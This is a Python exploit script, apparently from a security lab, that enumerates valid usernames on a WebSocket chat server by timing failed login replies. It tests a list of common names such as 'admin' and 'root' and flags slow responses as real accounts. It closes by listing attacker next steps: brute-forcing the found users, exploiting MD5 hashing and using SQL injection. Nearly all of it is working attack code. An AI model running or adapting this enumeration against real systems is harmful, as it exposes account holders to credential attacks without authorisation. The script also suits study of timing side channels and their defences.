#!/usr/bin/env python3
"""
TIMING ATTACK EXPLOITATION SCRIPT
This demonstrates how an attacker would exploit the timing vulnerability
to enumerate valid usernames in the system.

WARNING: This is for educational purposes only!
"""

import asyncio
import websockets
import json
import time
from typing import List, Tuple

class TimingAttackExploit:
    def __init__(self, server_url: str = "ws://127.0.0.1:8765"):
        self.server_url = server_url
        self.valid_users = []
        self.invalid_users = []
        
    async def test_username_timing(self, username: str, password: str = "wrongpassword") -> Tuple[str, float]:
        """
        Test a single username and measure response time.
        Returns (username, response_time_ms)
        """
        try:
            start_time = time.time()
            
            # Connect to WebSocket server
            async with websockets.connect(self.server_url) as websocket:
                # Send USER_HELLO
                hello_msg = {
                    "type": "USER_HELLO",
                    "from": username,
                    "to": "",
                    "ts": int(time.time() * 1000),
                    "payload": {"client": "timing-attack"}
                }
                await websocket.send(json.dumps(hello_msg))
                
                # Send USER_LOGIN with wrong password
                login_msg = {
                    "type": "USER_LOGIN",
                    "ts": int(time.time() * 1000),
                    "payload": {
                        "user_id": username,
                        "password": password
                    }
                }
                await websocket.send(json.dumps(login_msg))
                
                # Wait for response
                response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                end_time = time.time()
                
                response_time = (end_time - start_time) * 1000  # Convert to milliseconds
                return username, response_time
                
        except asyncio.TimeoutError:
            return username, 5000.0  # Timeout = 5 seconds
        except Exception as e:
            print(f"Error testing {username}: {e}")
            return username, 0.0
    
    async def enumerate_users(self, username_list: List[str]) -> None:
        """
        Test multiple usernames and categorize them based on response times.
        """
        print("🔍 Starting timing attack to enumerate valid usernames...")
        print("=" * 60)
        
        results = []
        
        for username in username_list:
            print(f"Testing username: {username:<20}", end="", flush=True)
            username, response_time = await self.test_username_timing(username)
            results.append((username, response_time))
            
            # Categorize based on response time
            if response_time > 100:  # Threshold for valid users
                self.valid_users.append(username)
                print(f" → {response_time:.1f}ms (LIKELY VALID USER)")
            else:
                self.invalid_users.append(username)
                print(f" → {response_time:.1f}ms (invalid user)")
            
            # Small delay between requests to avoid overwhelming server
            await asyncio.sleep(0.1)
        
        print("\n" + "=" * 60)
        print("📊 TIMING ATTACK RESULTS:")
        print("=" * 60)
        
        # Sort results by response time
        results.sort(key=lambda x: x[1], reverse=True)
        
        print("Response times (highest to lowest):")
        for username, response_time in results:
            status = "✅ VALID" if response_time > 100 else "❌ Invalid"
            print(f"  {username:<20} {response_time:>8.1f}ms {status}")
        
        print(f"\n🎯 LIKELY VALID USERS ({len(self.valid_users)}):")
        for user in self.valid_users:
            print(f"  - {user}")
        
        print(f"\n❌ INVALID USERS ({len(self.invalid_users)}):")
        for user in self.invalid_users:
            print(f"  - {user}")

async def main():
    """
    Main function demonstrating the timing attack.
    """
    print("🚨 TIMING ATTACK DEMONSTRATION")
    print("This script exploits the timing vulnerability to enumerate valid usernames.")
    print("Make sure the vulnerable server is running on ws://127.0.0.1:8765")
    print()
    
    # Common usernames to test
    common_usernames = [
        "admin", "administrator", "root", "user", "test", "guest",
        "alice", "bob", "charlie", "david", "eve", "frank",
        "john", "jane", "mike", "sarah", "tom", "lisa",
        "support", "help", "info", "contact", "service",
        "api", "system", "default", "demo", "sample"
    ]
    
    attacker = TimingAttackExploit()
    await attacker.enumerate_users(common_usernames)
    
    print("\n💡 NEXT STEPS FOR ATTACKER:")
    print("1. Focus brute force attacks on the valid usernames found above")
    print("2. Use common passwords with the valid usernames")
    print("3. The MD5 password hashing makes brute force much faster")
    print("4. Consider using the SQL injection to extract more user data")

if __name__ == "__main__":
    asyncio.run(main())
